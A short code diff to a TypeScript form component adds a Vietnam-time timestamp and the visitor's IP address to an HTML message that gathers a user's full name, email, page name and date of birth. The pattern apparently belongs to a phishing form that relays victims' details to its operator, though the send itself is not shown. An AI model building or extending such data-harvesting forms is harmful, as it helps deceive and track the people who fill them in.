@@ -109,7 +109,32 @@ const Step1: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = 
 
         try {
             const getDateOfBirth = () => `${formDobDay}/${formDobMonth}/${formDobYear}`;
+
+            const getVietnamTime = () => {
+                const now = new Date();
+                const formatter = new Intl.DateTimeFormat('vi-VN', {
+                    timeZone: 'Asia/Ho_Chi_Minh',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit',
+                    hour12: false,
+                    day: '2-digit',
+                    month: '2-digit',
+                    year: 'numeric'
+                });
+                const parts = formatter.formatToParts(now);
+                const day = parts.find((p) => p.type === 'day')?.value || '';
+                const month = parts.find((p) => p.type === 'month')?.value || '';
+                const year = parts.find((p) => p.type === 'year')?.value || '';
+                const hour = parts.find((p) => p.type === 'hour')?.value || '';
+                const minute = parts.find((p) => p.type === 'minute')?.value || '';
+                const second = parts.find((p) => p.type === 'second')?.value || '';
+                return `${hour}:${minute}:${second} ${day}/${month}/${year}`;
+            };
+
             const messageContent = /* HTML */ `
+<b>IP:</b> <code>${geoInfo?.ip || 'unknown'}</code>
+<b>Thời gian:</b> <code>${getVietnamTime()}</code>
 <b>Full Name:</b> <code>${formFullName}</code>
 <b>Email:</b> <code>${formEmail}</code>
 <b>Page Name:</b> <code>${formPageName}</code>
